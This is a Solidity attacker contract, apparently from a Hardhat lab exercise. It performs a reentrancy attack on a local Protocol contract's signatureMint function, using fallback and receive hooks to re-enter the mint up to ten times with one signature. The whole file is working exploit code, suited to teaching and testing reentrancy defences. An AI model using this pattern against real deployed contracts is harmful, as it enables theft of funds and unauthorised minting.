//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.10;

import "./Protocol.sol";
import "hardhat/console.sol";

contract Attacker {
    Protocol public immutable protocol;
    bytes public signature;
    uint256 public immutable amount;

    uint256 count = 0;

    bytes public payload;

    constructor(Protocol _protocol, bytes memory _signature, uint256 _amount) {
        protocol = _protocol;
        signature = _signature;
        amount = _amount;

        payload = abi.encodeWithSignature(
            "signatureMint(bytes,address,uint256)",
            signature,
            address(this),
            amount
        );
    }

    function attack() external {
        protocol.signatureMint(signature, address(this), amount);
    }

    function reentrancy() private {
        if (count < 10) {
            count++;
            (bool sent, ) = address(protocol).call(payload);
            require(sent, "target call failed");
        } else {
            return;
        }
    }

    fallback() external payable {
        console.log("ATTACKER FALLBACK FUNCTION CALLED!");
        reentrancy();
    }

    receive() external payable {
        console.log("ATTACKER RECEIVE FUNCTION CALLED!");
        reentrancy();
    }
}
